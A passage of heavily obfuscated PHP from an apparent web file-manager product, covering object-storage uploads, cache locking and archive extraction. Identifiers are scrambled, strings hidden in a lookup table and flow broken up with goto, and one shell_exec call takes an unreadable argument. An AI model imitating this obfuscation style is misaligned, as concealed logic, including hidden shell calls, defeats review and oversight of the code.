public function fileInfoImage($F¿â©ˆ‹Ø, &$c¢–◊›•‡©) { } public function setContent($e⁄ÌÒ“‘â¢, $Bó†ì«ßÆ˜ = '', $E£åòè¢¨∏ = false) { $Cá¥¬Úäπ =& $_SERVER[∞„˜ƒÑºª]; $e⁄ÌÒ“‘â¢ = $E£åòè¢¨∏ ? trim($e⁄ÌÒ“‘â¢, $Cá¥¬Úäπ[8]) . $Cá¥¬Úäπ[8] : $e⁄ÌÒ“‘â¢; $cˆ∞‚èÏèä = get_file_mime(get_path_ext($e⁄ÌÒ“‘â¢)); $E”êÀÆßÒÛ = $this->client->putObject($Bó†ì«ßÆ˜, $this->bucket, $e⁄ÌÒ“‘â¢, $Cá¥¬Úäπ[181], array(), $cˆ∞‚èÏèä); return $E”êÀÆßÒÛ ? !0 : !1; } public function getObjectInfo($bØ›ÿüÀàé) { $eÑ·¿Ü˜ö‘ =& $_SERVER[∞„˜ƒÑºª]; $D√≤àà—à– = $this->client->getObjectInfo($this->bucket, $bØ›ÿüÀàé); if (!isset($D√≤àà—à–[$eÑ·¿Ü˜ö‘[203]]) && isset($D√≤àà—à–[$eÑ·¿Ü˜ö‘[876]])) { $D√≤àà—à–[$eÑ·¿Ü˜ö‘[203]] = $D√≤àà—à–[$eÑ·¿Ü˜ö‘[876]]; } return $D√≤àà—à–; } public function upload($f†çÎçπÎ†, $fò¶Úæâ‘∞, $b≥‘™«Ë’≠ = false, $Aç‚°·¥•¶ = REPEAT_REPLACE) { $E ®ï˘É˜è =& $_SERVER[∞„˜ƒÑºª]; $BÜÀéﬂà‹£ = array(); $d¬√‡ÕÌ¥ÿ = array($E ®ï˘É˜è[195] => get_file_mime(get_path_ext($f†çÎçπÎ†))); if (IO::size($fò¶Úæâ‘∞) <= 1024 * 1024 * 200) { $dëºÚ¬≠∂Æ = $this->client->putObjectFile($fò¶Úæâ‘∞, $this->bucket, $f†çÎçπÎ†, $E ®ï˘É˜è[181], $BÜÀéﬂà‹£, $d¬√‡ÕÌ¥ÿ); return !empty($dëºÚ¬≠∂Æ) ? !0 : !1; } $AâÔ„à≤¬Á = $this->client->multiUploadObject($fò¶Úæâ‘∞, $this->bucket, trim($f†çÎçπÎ†, $E ®ï˘É˜è[8]), $BÜÀéﬂà‹£, $d¬√‡ÕÌ¥ÿ); return $AâÔ„à≤¬Á ? $this->getPathOuter($f†çÎçπÎ†) : !1; } public function blockChain($eÕ¥ûƒÏÇ«, $dùï‹µÑÉ¥) { $CÓ›ÍÙÕ¥€ =& $_SERVER[∞„˜ƒÑºª]; $e∏àíÒÛÜû = $this->getObjectInfo($eÕ¥ûƒÏÇ«); if (!$e∏àíÒÛÜû) { return !1; } return $this->client->copyObject($this->bucket, $eÕ¥ûƒÏÇ«, $this->bucket, $eÕ¥ûƒÏÇ«, $CÓ›ÍÙÕ¥€[181], array(), $dùï‹µÑÉ¥, $CÓ›ÍÙÕ¥€[877], !0); } } goto b“„≈¯Í÷’; f€ªÖûÔåø: class CacheLock { protected static $handle; protected static $timeout; protected static $lockItem = array(); public static function init() { goto E„¡ëæ ¯Œ; F Ω‹≤¶Ö°: switch ($B‹øÌÖıëﬁ[$bıÉ∫î„ÿÍ[521]]) { case $bıÉ∫î„ÿÍ[524]: self::$handle = new CacheLockRedis(); break; case $bıÉ∫î„ÿÍ[525]: self::$handle = new CacheLockMemcached(); break; case $bıÉ∫î„ÿÍ[17]: self::$handle = new CacheLockDatabase(); break; case $bıÉ∫î„ÿÍ[163]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto dô≈Ëå¨—¯; E„¡ëæ ¯Œ: $bıÉ∫î„ÿÍ =& $_SERVER[∞„˜ƒÑºª]; if (self::$handle) { return self::$handle; } $B‹øÌÖıëﬁ = $GLOBALS[$bıÉ∫î„ÿÍ[6]][$bıÉ∫î„ÿÍ[336]]; goto D—»éû¶êî; D—»éû¶êî: self::$timeout = $B‹øÌÖıëﬁ[$bıÉ∫î„ÿÍ[533]] ? $B‹øÌÖıëﬁ[$bıÉ∫î„ÿÍ[533]] : 10; $e¥πØôò¡À = $GLOBALS[$bıÉ∫î„ÿÍ[6]][$bıÉ∫î„ÿÍ[17]][$bıÉ∫î„ÿÍ[489]]; if ($B‹øÌÖıëﬁ[$bıÉ∫î„ÿÍ[521]] == $bıÉ∫î„ÿÍ[17] && $e¥πØôò¡À == $bıÉ∫î„ÿÍ[9]) { $B‹øÌÖıëﬁ[$bıÉ∫î„ÿÍ[521]] = $bıÉ∫î„ÿÍ[163]; } goto F Ω‹≤¶Ö°; dô≈Ëå¨—¯: } private static function key($C≥µÀ∆”æ·) { return $_SERVER[∞„˜ƒÑºª][534] . Cache::key($C≥µÀ∆”æ·); } public static function initReset() { self::$handle = !1; } public static function lockGlobal($F∆™îéîö¬, $dÆ≥åï“§) { return self::lock($F∆™îéîö¬, $dÆ≥åï“§, !0); } public static function lock($c∏…ÔÖ¿ò∂, $cøŸ§©∞ó‰ = false, $EŸ–≈¯÷“ß = false) { goto D¯æ¢ÀÚ∞±; BÑõÜÍ¯ìû: $d€¶É≤ôÖñ = timeFloat(); $cøŸ§©∞ó‰ = $cøŸ§©∞ó‰ ? $cøŸ§©∞ó‰ : self::$timeout; $b»Ò¬∂⁄ÿ¡ = $FôŒÕ”∫¿¿->lock($c∏…ÔÖ¿ò∂, $cøŸ§©∞ó‰); goto Cç∆„π®™Î; Cç∆„π®™Î: if (!$b»Ò¬∂⁄ÿ¡) { write_log($aø‘™®ìπ‹[535] . (timeFloat() - $d€¶É≤ôÖñ) . $aø‘™®ìπ‹[76] . get_caller_msg(), $aø‘™®ìπ‹[536]); show_json("\x4c\157\143\153\x20\x61\x63\164\x69\157\156\x3a\40{$c∏…ÔÖ¿ò∂}\x20\x74\x69\x6d\x65\157\x75\x74\54\157\x76\x65\x72\x20{$cøŸ§©∞ó‰}\40\x73", !1); } if (!$EŸ–≈¯÷“ß) { self::$lockItem[$c∏…ÔÖ¿ò∂] = !0; } return $b»Ò¬∂⁄ÿ¡; goto c‰Àí≤πΩŒ; D¯æ¢ÀÚ∞±: $aø‘™®ìπ‹ =& $_SERVER[∞„˜ƒÑºª]; $FôŒÕ”∫¿¿ = self::init(); $c∏…ÔÖ¿ò∂ = self::key($c∏…ÔÖ¿ò∂); goto BÑõÜÍ¯ìû; c‰Àí≤πΩŒ: } public static function unlock($AÁÚ˘Ã®‘∑) { $AÁÚ˘Ã®‘∑ = self::key($AÁÚ˘Ã®‘∑); self::$lockItem[$AÁÚ˘Ã®‘∑] = null; return self::init()->unlock($AÁÚ˘Ã®‘∑); } public static function unlockRuntime() { $E›êÑ¯»ÏÇ = self::$lockItem; $b≈ö¯›©ûá = self::init(); foreach ($E›êÑ¯»ÏÇ as $dË‚‡úè¡í => $fÖú´Óé„∂) { if ($fÖú´Óé„∂) { $b≈ö¯›©ûá->unlock($dË‚‡úè¡í); } } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $Fû–åœπÜ’ =& $_SERVER[∞„˜ƒÑºª]; $FºÀöïÚä∞ = $GLOBALS[$Fû–åœπÜ’[6]][$Fû–åœπÜ’[336]]; self::$cachePath = $FºÀöïÚä∞[$Fû–åœπÜ’[163]][$Fû–åœπÜ’[84]]; @mkdir(self::$cachePath, 511, !0); } public function lock($d‘å≥•·‰„, $A∆»ê»ü≈÷ = 0) { goto aÁéí§±µé; c÷òıòπ‡ú: $d’£Ω—êƒ∂ = rtrim(self::$cachePath, $F¬ùﬂÇŸ°—[8]) . $F¬ùﬂÇŸ°—[537] . md5($d‘å≥•·‰„) . $F¬ùﬂÇŸ°—[538]; if (file_exists($d’£Ω—êƒ∂) && filemtime($d’£Ω—êƒ∂) && filemtime($d’£Ω—êƒ∂) < time() - 10) { @unlink($d’£Ω—êƒ∂); } do { if (file_exists($d’£Ω—êƒ∂)) { cacheLockWait(); continue; } $e’—“öÍ¨π = fopen($d’£Ω—êƒ∂, $F¬ùﬂÇŸ°—[539]); $D¯’‘•Ö£¨ = flock($e’—“öÍ¨π, LOCK_EX | LOCK_NB); self::$caches[$d‘å≥•·‰„] = array($F¬ùﬂÇŸ°—[540] => $e’—“öÍ¨π, $F¬ùﬂÇŸ°—[163] => $d’£Ω—êƒ∂); fwrite($e’—“öÍ¨π, $CäÕœóöß ); clearstatcache(); if ($e’—“öÍ¨π && $D¯’‘•Ö£¨) { return !0; } cacheLockWait(); } while (microtime(!0) < $CäÕœóöß ); goto a®åÑåË˜ã; a®åÑåË˜ã: $this->unlock($d‘å≥•·‰„); return !1; goto E“ÇœÀ´ñ≥; aÁéí§±µé: $F¬ùﬂÇŸ°— =& $_SERVER[∞„˜ƒÑºª]; $Cïë∏£ÌÌÑ = microtime(!0); $CäÕœóöß  = $Cïë∏£ÌÌÑ + $A∆»ê»ü≈÷ + 0.0001; goto c÷òıòπ‡ú; E“ÇœÀ´ñ≥: } public function unlock($E≈‡À√πôﬁ) { goto Fÿæˆ÷Ú—‘; CúÀ®» Á”: @flock($BâœÎ√ ãî[$c—ÌÃêÎü†[540]], LOCK_UN); @fclose($BâœÎ√ ãî[$c—ÌÃêÎü†[540]]); @unlink($BâœÎ√ ãî[$c—ÌÃêÎü†[163]]); goto EÜ¯îœÇ¥ç; Fÿæˆ÷Ú—‘: $c—ÌÃêÎü† =& $_SERVER[∞„˜ƒÑºª]; $BâœÎ√ ãî = self::$caches[$E≈‡À√πôﬁ]; if (!$BâœÎ√ ãî) { return; } goto CúÀ®» Á”; EÜ¯îœÇ¥ç: unset(self::$caches[$E≈‡À√πôﬁ]); goto E›·µ°´€¯; E›·µ°´€¯: } } goto c›∫Û¨©Ñ“; D°√†´∫Â¥: define($_SERVER[∞„˜ƒÑºª][225], 1); define($_SERVER[∞„˜ƒÑºª][226], 2); define($_SERVER[∞„˜ƒÑºª][227], 3); goto D≤å≠© §„; e◊âè÷∂∑ã: set_error_handler($_SERVER[ÔÒÀÃÆ›—ü][28], $A≥ÌÜ¢ãßë); if (function_exists($_SERVER[ÔÒÀÃÆ›—ü][29])) { set_exception_handler($_SERVER[ÔÒÀÃÆ›—ü][30]); } $_SERVER[$_SERVER[ÔÒÀÃÆ›—ü][31]] = BASIC_PATH . $_SERVER[ÔÒÀÃÆ›—ü][32]; goto d‚Îéêüë˜; Aáá∑öôä√: class KodArchive { static function init() { goto D¶£∂•…®å; D¶£∂•…®å: $D–∏äèÃúá =& $_SERVER[∞„˜ƒÑºª]; if (defined($D–∏äèÃúá[1249])) { return; } define($D–∏äèÃúá[1249], SDK_DIR . $D–∏äèÃúá[1250]); goto DπØÕÕüÛ£; bïç§∫„Ãµ: require_once ARCHIVE_LIB . $D–∏äèÃúá[1257]; require_once ARCHIVE_LIB . $D–∏äèÃúá[1258]; require_once ARCHIVE_LIB . $D–∏äèÃúá[1259]; goto BÜŸâ¯Ê™À; DπØÕÕüÛ£: define($D–∏äèÃúá[1251], TEMP_FILES); define($D–∏äèÃúá[1252], TEMP_FILES); define($D–∏äèÃúá[1253], $D–∏äèÃúá[1254]); goto béä‹“°‡¬; béä‹“°‡¬: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $D–∏äèÃúá[1255]; require_once ARCHIVE_LIB . $D–∏äèÃúá[1256]; goto bïç§∫„Ãµ; BÜŸâ¯Ê™À: require_once ARCHIVE_LIB . $D–∏äèÃúá[1260]; goto eè∞∂òÔº’; eè∞∂òÔº’: } static function checkIfType($C∫Â ≥÷ﬁì, $c≥¨π∆¶÷Ò) { goto dîåãÛ≠˘ﬁ; A„√Ëëìπ¡: return $Eµ¡éåÈﬂ¢; goto c«…Ñ€⁄ò”; bˆ≠âÚí•∫: $Eµ¡éåÈﬂ¢ = in_array($C∫Â ≥÷ﬁì, $bòÏª„ﬂŸ¯[$c≥¨π∆¶÷Ò]); if ($Eµ¡éåÈﬂ¢ && ($c≥¨π∆¶÷Ò == $EâùÕ¶†√å[300] || $c≥¨π∆¶÷Ò == $EâùÕ¶†√å[1264]) && (!function_exists($EâùÕ¶†√å[1274]) || !function_exists($EâùÕ¶†√å[1275]))) { show_tips($EâùÕ¶†√å[1276]); } if ($Eµ¡éåÈﬂ¢ && $c≥¨π∆¶÷Ò == $EâùÕ¶†√å[774] && (!function_exists($EâùÕ¶†√å[1277]) || !strstr(shell_exec($EâùÕ¶†√å[1278]), $EâùÕ¶†√å[1279]))) { show_tips($EâùÕ¶†√å[1280]); } goto A„√Ëëìπ¡; dîåãÛ≠˘ﬁ: $EâùÕ¶†√å =& $_SERVER[∞„˜ƒÑºª]; self::init(); $bòÏª„ﬂŸ¯ = array($EâùÕ¶†√å[300] => array($EâùÕ¶†√å[300], $EâùÕ¶†√å[1261], $EâùÕ¶†√å[1262], $EâùÕ¶†√å[1263]), $EâùÕ¶†√å[1264] => array($EâùÕ¶†√å[1264], $EâùÕ¶†√å[1265], $EâùÕ¶†√å[1266], $EâùÕ¶†√å[1267]), $EâùÕ¶†√å[774] => array($EâùÕ¶†√å[774], $EâùÕ¶†√å[1268], $EâùÕ¶†√å[1269], $EâùÕ¶†√å[1270], $EâùÕ¶†√å[1271], $EâùÕ¶†√å[1272], $EâùÕ¶†√å[1273])); goto bˆ≠âÚí•∫; c«…Ñ€⁄ò”: } static function listContent($dî§°óûªı, $E≈Ã®ıÓÍ⁄ = true) { $c∆ò∫ñ⁄ø≤ =& $_SERVER[∞„˜ƒÑºª]; self::init(); $F⁄´É’„ˆÖ = $GLOBALS[$c∆ò∫ñ⁄ø≤[775]] ? $GLOBALS[$c∆ò∫ñ⁄ø≤[775]] : get_path_ext($dî§°óûªı); $Dáé›•ì÷ë = !1; if (self::checkIfType($F⁄´É’„ˆÖ, $c∆ò∫ñ⁄ø≤[1264])) { $Fì›π“Ç¿Ú = PclTarList($dî§°óûªı, $F⁄´É’„ˆÖ); $Dáé›•ì÷ë = array(); for ($E¥ºá‰Òúñ = 0; $E¥ºá‰Òúñ < count($Fì›π“Ç¿Ú); $E¥ºá‰Òúñ++) { $C∏ïÖàê∏Ç = $Fì›π“Ç¿Ú[$E¥ºá‰Òúñ]; if ($C∏ïÖàê∏Ç[$c∆ò∫ñ⁄ø≤[1281]] == $c∆ò∫ñ⁄ø≤[1282] || $C∏ïÖàê∏Ç[$c∆ò∫ñ⁄ø≤[1281]] == $c∆ò∫ñ⁄ø≤[1283]) { continue; } if ($E≈Ã®ıÓÍ⁄) { $C∏ïÖàê∏Ç[$c∆ò∫ñ⁄ø≤[1284]] = ltrim($C∏ïÖàê∏Ç[$c∆ò∫ñ⁄ø≤[1284]], $c∆ò∫ñ⁄ø≤[861]); } if ($C∏ïÖàê∏Ç[$c∆ò∫ñ⁄ø≤[1281]] == $c∆ò∫ñ⁄ø≤[1285]) { $C∏ïÖàê∏Ç[$c∆ò∫ñ⁄ø≤[85]] = !0; } else { $C∏ïÖàê∏Ç[$c∆ò∫ñ⁄ø≤[85]] = !1; } $C∏ïÖàê∏Ç[$c∆ò∫ñ⁄ø≤[766]] = $E¥ºá‰Òúñ; $Dáé›•ì÷ë[] = $C∏ïÖàê∏Ç; } } else { if (self::checkIfType($F⁄´É’„ˆÖ, $c∆ò∫ñ⁄ø≤[774])) { $Dç°—üÓÆØ = kodRarArchive::listContent($dî§°óûªı); if (!$Dç°—üÓÆØ[$c∆ò∫ñ⁄ø≤[762]]) { return $Dç°—üÓÆØ; } else { $Dáé›•ì÷ë = $Dç°—üÓÆØ[$c∆ò∫ñ⁄ø≤[764]]; } } else { if (kodZipArchive::support($c∆ò∫ñ⁄ø≤[354])) { $Dáé›•ì÷ë = kodZipArchive::listContent($dî§°óûªı); } else { $dÚÁŸª‰’ç = new PclZip($dî§°óûªı); $Dáé›•ì÷ë = $dÚÁŸª‰’ç->listContent(); } } } if ($Dáé›•ì÷ë) { $fçÏ÷¿º≈ë = unzip_charset_get($Dáé›•ì÷ë); $E≈Ã®ıÓÍ⁄ = $E≈Ã®ıÓÍ⁄ && function_exists($c∆ò∫ñ⁄ø≤[74]); for ($E¥ºá‰Òúñ = 0; $E¥ºá‰Òúñ < count($Dáé›•ì÷ë); $E¥ºá‰Òúñ++) { $Dáé›•ì÷ë[$E¥ºá‰Òúñ][$c∆ò∫ñ⁄ø≤[1284]] = str_replace(array($c∆ò∫ñ⁄ø≤[798], $c∆ò∫ñ⁄ø≤[1286]), $c∆ò∫ñ⁄ø≤[529], $Dáé›•ì÷ë[$E¥ºá‰Òúñ][$c∆ò∫ñ⁄ø≤[1284]]); if ($E≈Ã®ıÓÍ⁄) { $Dáé›•ì÷ë[$E¥ºá‰Òúñ][$c∆ò∫ñ⁄ø≤[1284]] = iconv_to($Dáé›•ì÷ë[$E¥ºá‰Òúñ][$c∆ò∫ñ⁄ø≤[1284]], $fçÏ÷¿º≈ë, $c∆ò∫ñ⁄ø≤[325]); unset($Dáé›•ì÷ë[$E¥ºá‰Òúñ][$c∆ò∫ñ⁄ø≤[1287]]); } } return array($c∆ò∫ñ⁄ø≤[762] => !0, $c∆ò∫ñ⁄ø≤[764] => $Dáé›•ì÷ë); } else { return array($c∆ò∫ñ⁄ø≤[762] => !1, $c∆ò∫ñ⁄ø≤[764] => $Dáé›•ì÷ë); } } static function extract($dÜáóº≠ˆÂ, $fƒá’ßÜò¬, $EÏ¥¢ÕÚÒÀ = "\x2d\x31", &$c¨˜”êÖüå = false) { goto FÛŸ≠ˆ√¯”; D·ﬁ´ı†”ê: $BÁ¯†ÿÕ∆ˆ = self::listContent($dÜáóº≠ˆÂ, !1); if (!$BÁ¯†ÿÕ∆ˆ[$aπÍºáéË[762]]) { return $BÁ¯†ÿÕ∆ˆ; } if ($EÏ¥¢ÕÚÒÀ != $aπÍºáéË[761]) { goto b´˜‹Ñ›€˜; b´˜‹Ñ›€˜: $Aò√›æ≤≤√ = self::fileIndex($BÁ¯†ÿÕ∆ˆ[$aπÍºáéË[764]], $EÏ¥¢ÕÚÒÀ); $c¨˜”êÖüå = str_replace(array($aπÍºáéË[798], $aπÍºáéË[1286]), $aπÍºáéË[79], $Aò√›æ≤≤√[$aπÍºáéË[1284]]); $dëåªŸœ»ø = $c¨˜”êÖüå; goto dåÑü“ˆ£∑; fî÷ŒïÔë◊: if ($Aò√›æ≤≤√[$aπÍºáéË[85]]) { $dëåªŸœ»ø = rtrim($dëåªŸœ»ø, $aπÍºáéË[8]) . $aπÍºáéË[8]; $c¨˜”êÖüå = array($c¨˜”êÖüå); } $Döá·Ø™Ù‚ = str_replace($aπÍºáéË[100], $aπÍºáéË[8], $dëåªŸœ»ø); if (substr($Döá·Ø™Ù‚, -1) == $aπÍºáéË[8]) { if (!strstr(trim($Döá·Ø™Ù‚, $aπÍºáéË[8]), $aπÍºáéË[8])) { $fƒá’ßÜò¬ = $fƒá’ßÜò¬ . get_path_this($Döá·Ø™Ù‚) . $aπÍºáéË[8]; } } else { if ($d≤Ÿìç¯øè == $dëåªŸœ»ø) { $d≤Ÿìç¯øè = $aπÍºáéË[33]; } } goto D£Û”‰˜ß‚; dåÑü“ˆ£∑: if ($GLOBALS[$aπÍºáéË[6]][$aπÍºáéË[859]] != $aπÍºáéË[325]) { $dëåªŸœ»ø = unzip_pre_name($c¨˜”êÖüå); } $d≤Ÿìç¯øè = get_path_father($c¨˜”êÖüå); if ($d≤Ÿìç¯øè == $c¨˜”êÖüå) { $d≤Ÿìç¯øè = $aπÍºáéË[33]; } goto fî÷ŒïÔë◊; D£Û”‰˜ß‚: } goto CÏä·±—◊Õ; CÏä·±—◊Õ: if (self::checkIfType($A≥ªÉ‘ì∞ç, $aπÍºáéË[1264])) { if ($EÏ¥¢ÕÚÒÀ != $aπÍºáéË[761]) { $dëåªŸœ»ø = unzip_pre_name($dëåªŸœ»ø); $d≤Ÿìç¯øè = unzip_pre_name($d≤Ÿìç¯øè); $B⁄ˆıíèÚò = PclTarExtractList($dÜáóº≠ˆÂ, array($dëåªŸœ»ø), $fƒá’ßÜò¬, $d≤Ÿìç¯øè, $A≥ªÉ‘ì∞ç); } else { $B⁄ˆıíèÚò = PclTarExtract($dÜáóº≠ˆÂ, $fƒá’ßÜò¬, $aπÍºáéË[361], $A≥ªÉ‘ì∞ç); } return array($aπÍºáéË[762] => $B⁄ˆıíèÚò, $aπÍºáéË[764] => PclErrorString(!0)); } else { if (self::checkIfType($A≥ªÉ‘ì∞ç, $aπÍºáéË[774])) { return kodRarArchive::extract($dÜáóº≠ˆÂ, $fƒá’ßÜò¬, $A≥ªÉ‘ì∞ç, $c¨˜”êÖüå); } else { if (kodZipArchive::support($aπÍºáéË[1288])) { return kodZipArchive::extract($dÜáóº≠ˆÂ, $fƒá’ßÜò¬, $c¨˜”êÖüå); } else { $DÉŸÆå®à≥ = new PclZip($dÜáóº≠ˆÂ); if ($EÏ¥¢ÕÚÒÀ != $aπÍºáéË[761]) { $B⁄ˆıíèÚò = $DÉŸÆå®à≥->extract(PCLZIP_OPT_PATH, $fƒá’ßÜò¬, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $aπÍºáéË[1289], PCLZIP_OPT_BY_NAME, $Aò√›æ≤≤√[$aπÍºáéË[1284]], PCLZIP_OPT_REMOVE_PATH, $d≤Ÿìç¯øè, PCLZIP_OPT_REPLACE_NEWER); } else { $B⁄ˆıíèÚò = $DÉŸÆå®à≥->extract(PCLZIP_OPT_PATH, $fƒá’ßÜò¬, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $aπÍºáéË[1289], PCLZIP_OPT_REPLACE_NEWER); } return array($aπÍºáéË[762] => $B⁄ˆıíèÚò, $aπÍºáéË[764] => $DÉŸÆå®à≥->errorName(!0)); } } } return array($aπÍºáéË[762] => !1, $aπÍºáéË[764] => $aπÍºáéË[1290]); goto F∆óÜ≠’øÆ; FÛŸ≠ˆ√¯”: $aπÍºáéË =& $_SERVER[∞„˜ƒÑºª]; self::init(); $A≥ªÉ‘ì∞ç = $GLOBALS[$aπÍºáéË[775]] ? $GLOBALS[$aπÍºáéË[775]] : get_path_ext($dÜáóº≠ˆÂ); goto D·ﬁ´ı†”ê; F∆óÜ≠’øÆ: } static function fileIndex($F†Ê®È‹ø∆, $C«õ®ıπ»Ã, $a‘í·ÍïìÕ = false) { goto EÑ∫Ê√Úµ¬; câªº´™àË: $E⁄ÿ¥ëÜÈÀ = $dπ«êõèõ√; if ($a‘í·ÍïìÕ) { $E⁄ÿ¥ëÜÈÀ = $dπ«êõèõ√[$a‘í·ÍïìÕ]; if ($dπ«êõèõ√[$eŸçö∂áø±[85]]) { $E⁄ÿ¥ëÜÈÀ = rtrim($E⁄ÿ¥ëÜÈÀ, $eŸçö∂áø±[8]) . $eŸçö∂áø±[8]; } } return $E⁄ÿ¥ëÜÈÀ; goto CﬁÈÍ≈ÍÂŒ; EÑ∫Ê√Úµ¬: $eŸçö∂áø± =& $_SERVER[∞„˜ƒÑºª]; self::init(); if (!is_array($F†Ê®È‹ø∆)) { return !1; } goto AÿˆçöªÎÆ; AÿˆçöªÎÆ: $Aô ∏≤„Ô≠ = count($F†Ê®È‹ø∆); for ($a·⁄ÀˆîÈ€ = 0; $a·⁄ÀˆîÈ€ < $Aô ∏≤„Ô≠; $a·⁄ÀˆîÈ€++) { if ($C«õ®ıπ»Ã == $F†Ê®È‹ø∆[$a·⁄ÀˆîÈ€][$eŸçö∂áø±[766]]) { $dπ«êõèõ√ = $F†Ê®È‹ø∆[$a·⁄ÀˆîÈ€]; break; } } if (!$dπ«êõèõ√) { show_tips($eŸçö∂áø±[1291]); } goto câªº´™àË; CﬁÈÍ≈ÍÂŒ: } static function extractZipFile($eÇ¯„ì÷π·, $E„Â¢óóë√, $e±±êÍÍŸŒ = false) { goto EÕ«ıÌçÑÆ; aªÜàé∞ôô: mk_dir($BÀ˘ÆÇäÂﬁ); $a◊›ÁÜ¶µÊ = $BÀ˘ÆÇäÂﬁ . md5($eÇ¯„ì÷π· . $E„Â¢óóë√); if ($e±±êÍÍŸŒ) { $a◊›ÁÜ¶µÊ = $BÀ˘ÆÇäÂﬁ . $e±±êÍÍŸŒ; } goto CÑıÈ…≤¯†; Eè˘µñ¨ñ‚: if (!file_exists($fä÷úÕåÏª)) { return !1; } @rename($fä÷úÕåÏª, $a◊›ÁÜ¶µÊ); return $a◊›ÁÜ¶µÊ; goto eæËÊ…îÕÜ; EÕ«ıÌçÑÆ: $d°√“Ñ÷ÿ© =& $_SERVER[∞„˜ƒÑºª]; self::init(); $BÀ˘ÆÇäÂﬁ = TEMP_FILES . hash_path($eÇ¯„ì÷π·) . $d°√“Ñ÷ÿ©[8]; goto aªÜàé∞ôô; aŒá∞ñ¨ÿ◊: $bø§Îëüµá = get_path_father($E„Â¢óóë√); if ($bø§Îëüµá == $E„Â¢óóë√) { $bø§Îëüµá = $d°√“Ñ÷ÿ©[33]; } $bŸùúï«ñ¥ = $CÌåï¬àÒ©->extract(PCLZIP_OPT_PATH, $BÀ˘ÆÇäÂﬁ, PCLZIP_CB_PRE_FILE_NAME, $d°√“Ñ÷ÿ©[1289], PCLZIP_OPT_REMOVE_PATH, $bø§Îëüµá, PCLZIP_OPT_BY_NAME, $E„Â¢óóë√); goto Eè˘µñ¨ñ‚; CÑıÈ…≤¯†: if (file_exists($a◊›ÁÜ¶µÊ)) { return $a◊›ÁÜ¶µÊ; } $CÌåï¬àÒ© = new PclZip($eÇ¯„ì÷π·); $fä÷úÕåÏª = unzip_filter_ext($BÀ˘ÆÇäÂﬁ . get_path_this($E„Â¢óóë√)); goto aŒá∞ñ¨ÿ◊; eæËÊ…îÕÜ: } static function filePreview($f…ØúÎﬁã∑, $d≤ïø…–åÌ, $b≈ëñÎ’Üë = false, $cà¿ôâ±— = false) { goto F◊†∏¡–Ñµ; dîÑªÍÏ£Í: if (!$CÊÈãòöΩ¢[$DÿßùÚÀﬁä[762]]) { show_json($CÊÈãòöΩ¢[$DÿßùÚÀﬁä[764]], !1); } if (!file_exists($AøºÂΩ‰ê‘)) { show_json($DÿßùÚÀﬁä[1293], !1); } @rename($AøºÂΩ‰ê‘, $d°ù¥Æù¨∫); goto Cô€‹ΩÃê·; A√µŸƒ∫∫á: $cÖÙÁÛëÛ‰ = unzip_pre_name($cÖÙÁÛëÛ‰); $A«èÁﬁËÓÖ = get_path_this($cÖÙÁÛëÛ‰); $AøºÂΩ‰ê‘ = unzip_filter_ext($c‡∑ìÈõ’Ò . $A«èÁﬁËÓÖ); goto dîÑªÍÏ£Í; Cô€‹ΩÃê·: if (!file_exists($d°ù¥Æù¨∫)) { del_dir($c‡∑ìÈõ’Ò); show_json($DÿßùÚÀﬁä[1294]); } IO::fileOut($d°ù¥Æù¨∫, $b≈ëñÎ’Üë, $A«èÁﬁËÓÖ); goto Fçœﬁ„—À´; F◊†∏¡–Ñµ: $DÿßùÚÀﬁä =& $_SERVER[∞„˜ƒÑºª]; self::init(); $c‡∑ìÈõ’Ò = TEMP_FILES . hash_path($f…ØúÎﬁã∑) . $DÿßùÚÀﬁä[8]; goto e¡∑®ü·ü∂; E±Íô‘¥®ª: $CÊÈãòöΩ¢ = self::extract($f…ØúÎﬁã∑, $c‡∑ìÈõ’Ò, $d≤ïø…–åÌ, $cÖÙÁÛëÛ‰); if (is_array($cÖÙÁÛëÛ‰)) { show_json($DÿßùÚÀﬁä[1292], !1); } if (file_exists($d°ù¥Æù¨∫)) { IO::fileOut($d°ù¥Æù¨∫, $b≈ëñÎ’Üë, get_path_this($cÖÙÁÛëÛ‰)); return; } goto A√µŸƒ∫∫á; e¡∑®ü·ü∂: mk_dir($c‡∑ìÈõ’Ò); $d°ù¥Æù¨∫ = $c‡∑ìÈõ’Ò . md5($f…ØúÎﬁã∑ . $d≤ïø…–åÌ . $cà¿ôâ±—); $cÖÙÁÛëÛ‰ = $DÿßùÚÀﬁä[33]; goto E±Íô‘¥®ª; Fçœﬁ„—À´: } static function create($D•‘≠é±·â, $aï¥∑¨†•∑) { $dœπ”ä¥úÚ =& $_SERVER[∞„˜ƒÑºª]; self::init(); $d¡æ±Øö™Ü = get_path_ext($D•‘≠é±·â); $c¬ÁÈÇƒ·– = !1; if (self::checkIfType($d¡æ±Øö™Ü, $dœπ”ä¥úÚ[300])) { if (kodZipArchive::support($dœπ”ä¥úÚ[744])) { return kodZipArchive::create($D•‘≠é±·â, $aï¥∑¨†•∑); } $f◊Ó›Öªâ‘ = new PclZip($D•‘≠é±·â); foreach ($aï¥∑¨†•∑ as $eÿØª√€Ì≥ => $eâ©·±øË“) { $eâ©·±øË“ = str_replace($dœπ”ä¥úÚ[1295], $dœπ”ä¥úÚ[8], $eâ©·±øË“); $aï›≥ë™È± = Kodio::clear(get_path_father($eâ©·±øË“)); if ($eÿØª√€Ì≥ == 0) { $c¬ÁÈÇƒ·– = $f◊Ó›Öªâ‘->create($eâ©·±øË“, PCLZIP_OPT_REMOVE_PATH, $aï›≥ë™È±, PCLZIP_CB_PRE_FILE_NAME, $dœπ”ä¥úÚ[1296]); continue; } $c¬ÁÈÇƒ·– = $f◊Ó›Öªâ‘->add($eâ©·±øË“, PCLZIP_OPT_REMOVE_PATH, $aï›≥ë™È±, PCLZIP_CB_PRE_FILE_NAME, $dœπ”ä¥úÚ[1296]); } } else { if (self::checkIfType($d¡æ±Øö™Ü, $dœπ”ä¥úÚ[1264])) { foreach ($aï¥∑¨†•∑ as $eÿØª√€Ì≥ => $eâ©·±øË“) { $eâ©·±øË“ = str_replace($dœπ”ä¥úÚ[1295], $dœπ”ä¥úÚ[8], $eâ©·±øË“); $aï›≥ë™È± = Kodio::clear(get_path_father($eâ©·±øË“)); if 